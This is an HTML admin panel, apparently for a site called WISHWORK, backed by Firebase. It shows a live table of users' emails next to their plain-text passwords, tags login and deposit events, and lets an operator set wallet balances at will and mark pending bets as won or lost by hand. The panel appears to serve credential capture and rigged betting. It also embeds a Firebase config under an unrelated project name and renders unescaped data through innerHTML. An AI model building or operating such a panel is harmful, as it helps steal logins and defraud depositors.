<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ADMIN | WISHWORK</title>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;900&display=swap" rel="stylesheet">
    <style>
        body { background: #020205; color: white; font-family: 'Outfit'; padding: 20px; }
        h1 { text-align: center; background: linear-gradient(to right, #38bdf8, #c084fc); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .table-card { background: rgba(255,255,255,0.03); border-radius: 20px; padding: 15px; border: 1px solid rgba(255,255,255,0.1); }
        table { width: 100%; border-collapse: collapse; }
        th { text-align: left; font-size: 10px; color: #38bdf8; padding: 10px; }
        td { padding: 12px 10px; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 12px; }
        .btn { padding: 5px 10px; border: none; border-radius: 5px; color: white; cursor: pointer; font-weight: 800; margin-right: 5px; }
        .win { background: #22c55e; } .loss { background: #ef4444; } .del { background: #444; }
        .login-row { border-left: 4px solid #a855f7; }
        .deposit-row { border-left: 4px solid #00f2ff; }
    </style>
</head>
<body>

<h1>CONTROL CENTER</h1>
<div class="table-card">
    <table>
        <thead><tr><th>USER (CLICK BAL)</th><th>VALUE</th><th>TYPE</th><th>ACTION</th></tr></thead>
        <tbody id="adminBody"></tbody>
    </table>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getFirestore, collection, query, orderBy, onSnapshot, doc, deleteDoc, updateDoc, getDoc, setDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

    const firebaseConfig = { apiKey: "AIzaSyDVku-LXDpxjm_8mwsUJr5nUtwhsA3MSf8", authDomain: "home-help-service.firebaseapp.com", projectId: "home-help-service", storageBucket: "home-help-service.firebasestorage.app", messagingSenderId: "160722457510", appId: "1:160722457510:web:f2c5fa0b922a0ccc58b567" };
    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    window.editBal = async (email) => {
        const val = prompt(`Set wallet for ${email}:`);
        if(val) await setDoc(doc(db, "wallets", email), { balance: parseInt(val) });
    };

    window.resolve = async (id, res, email, amtStr) => {
        const amt = parseInt(amtStr.replace(/[^\d]/g, ''));
        await updateDoc(doc(db, "users", id), { status: res });
        if(res === "WIN 🏆") {
            const s = await getDoc(doc(db, "wallets", email));
            const cur = s.exists() ? s.data().balance : 0;
            await updateDoc(doc(db, "wallets", email), { balance: cur + (amt * 2) });
        }
    };

    window.delLog = async (id) => { if(confirm("Delete?")) await deleteDoc(doc(db, "users", id)); };

    onSnapshot(query(collection(db, "users"), orderBy("time", "desc")), (snap) => {
        const body = document.getElementById("adminBody");
        let html = "";
        snap.forEach(d => {
            const data = d.data();
            const rowClass = data.actionType.includes("LOGIN") ? "login-row" : (data.actionType === "DEPOSIT" ? "deposit-row" : "");
            html += `<tr class="${rowClass}">
                <td onclick="editBal('${data.email}')" style="color:#38bdf8; cursor:pointer;">${data.email ? data.email.split('@')[0] : '???'}</td>
                <td>${data.password}</td>
                <td>${data.actionType}</td>
                <td>
                    ${data.status === "PENDING" ? `
                        <button class="btn win" onclick="resolve('${d.id}','WIN 🏆','${data.email}','${data.password}')">W</button>
                        <button class="btn loss" onclick="resolve('${d.id}','LOST 💀','${data.email}','${data.password}')">L</button>
                    ` : `<span>${data.status}</span>`}
                    <button class="btn del" onclick="delLog('${d.id}')">×</button>
                </td>
            </tr>`;
        });
        body.innerHTML = html;
    });
</script>
</body>
</html>
